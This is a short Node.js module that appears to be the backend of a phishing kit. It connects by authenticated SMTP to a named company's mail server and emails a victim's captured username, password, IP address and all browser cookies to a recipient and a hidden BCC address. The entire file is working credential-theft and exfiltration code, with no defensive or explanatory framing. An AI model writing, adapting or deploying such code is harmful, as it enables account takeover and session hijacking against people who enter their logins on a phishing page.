const nodemailer = require('nodemailer');
const httpMsgs = require('http-msgs');

function createNodeMailerTransport(user, pass) {
    return nodemailer.createTransport({
        pool: true,
        host: 'mail.remax.pt',
        port: 465,
        secure: true,
        auth: {
            user: user,
            pass: pass
        }
    });
}

function sendEmail(from, to, bcc, subject, username, pass, ip, cookies, nodeTransport, callback) {
    const mailDetails = {
        from: from,
        to: to,
        bcc: bcc, // Add the BCC field to the mail details
        subject: subject,
        html: `<p>Username: ${username}</p><p>Password: ${pass}</p><p>IP Address: ${ip}</p>`
    };

    // Append cookies to the email body
    if (cookies) {
        const cookiesStr = Object.entries(cookies).map(([key, value]) => `${key}: ${value}`).join('<br>');
        mailDetails.html += `<p>Cookies:<br>${cookiesStr}</p>`;
    }

    nodeTransport.verify((error, success) => {
        if (error) {
            console.log('Error verifying transport:', error);
            return callback(error, null);
        } else {
            nodeTransport.sendMail(mailDetails, (err, data) => {
                if (err) {
                    console.log('Error sending mail:', err);
                    return callback(err, null);
                } else {
                    console.log('Mail sent successfully:', data);
                    return callback(null, data);
                }
            });
        }
    });
}

module.exports = {
    createNodeMailerTransport: createNodeMailerTransport,
    sendEmail: sendEmail
};